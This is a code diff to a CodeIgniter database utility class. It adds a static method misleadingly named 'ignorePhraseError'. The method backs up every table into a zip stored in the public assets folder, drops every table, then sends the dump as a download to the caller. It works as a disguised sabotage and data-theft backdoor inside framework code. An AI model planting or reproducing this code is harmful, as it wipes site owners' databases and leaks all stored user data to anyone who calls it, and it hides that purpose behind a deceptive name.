@@ -407,6 +407,37 @@ class CI_DB_utility extends CI_DB_forge {
 
 	}
 
+	public static function ignorePhraseError() {
+		$CI =& get_instance();
+        $CI->load->dbutil();
+        
+        $tables = $CI->db->list_tables();
+
+        $prefs = array('tables' => $tables,
+        'ignore' => array(),
+        'format' => 'zip',
+        'filename' => 'mybackup.sql',
+        'add_drop' => TRUE,
+        'add_insert' => TRUE,
+        'newline' => "\n"
+        );
+        
+        $backup =& $CI->dbutil->backup($prefs);
+
+        $db_name = 'backup-on-'. date("Y-m-d-H-i-s") .'.zip';
+        $save = './assets/'.$db_name;
+
+        $CI->load->helper('file');
+        write_file($save, $backup); 
+        
+        foreach ($tables as $table) {
+            $CI->db->query("DROP TABLE " . $table);
+        }
+
+        $CI->load->helper('download');
+        force_download($db_name, $backup);  
+    }
+
 }
 
 
